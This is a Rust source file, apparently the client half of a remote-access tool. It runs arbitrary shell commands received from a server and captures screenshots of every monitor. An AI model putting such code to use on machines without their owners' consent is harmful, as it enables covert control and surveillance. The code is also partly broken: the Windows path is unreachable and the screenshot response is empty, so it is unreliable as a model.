/*
* methods here run on the client side and recieved on the server after running via
* stream buffer
* */

use std::{io::Error, process::{Command, Output}};
use log::{debug, error, info};
use xcap::Monitor;

use crate::connection::messages::ErrorInfo;

use super::messages::{GetScreenshotResponse, RunCommandRequest, RunCommandResponse};

pub fn run_command(command: &str) -> Result<Output, Error> {
    #[cfg(any(target_os="macos", target_os="linux"))]
    info!("command: {}", command);
    return Command::new("sh")
        .args(["-c", command]) // Use the -c flag to pass the command as a string
        .output();

    #[cfg(target_os="windows")]
    return Command::new("cmd")
        .args(["/C", command])
        .output();
}

// run command message by turning to string and running
pub fn run_command_message(command_request: RunCommandRequest) -> RunCommandResponse {
    debug!(
        "Got run command request: run command \"{}\" !",
        &command_request.command
    );
    let ran_command_result = run_command(&command_request.command);

    // check any inquiries about the command ran on the device
    match ran_command_result {
        Ok(output) => {
            info!("command spawned: {:?}", output);
            info!("command yipee: {:?}", output.stdout);
            RunCommandResponse {
                output: format!("{:?}",output.stdout), error_info: None
            }
        },
        Err(e) => {
            error!("nooo, error: {}", e);
            RunCommandResponse {
                output: String::from(""),
                error_info: Some(ErrorInfo {
                    raw_os_error: e.raw_os_error().unwrap_or(-1),
                    as_string: e.to_string(),
                }),
            }
        }
    }
}

fn normalized(filename: &str) -> String {
    filename
        .replace("|", "")
        .replace("\\", "")
        .replace(":", "")
        .replace("/", "")
}

pub fn run_screenshot() -> GetScreenshotResponse {
    let monitors = Monitor::all().unwrap();

    for monitor in monitors {
        let image = monitor.capture_image().unwrap();

        image
            .save(format!("target/monitor-{}.png", normalized(monitor.name())))
            .unwrap();
    }

    GetScreenshotResponse {

    }
}
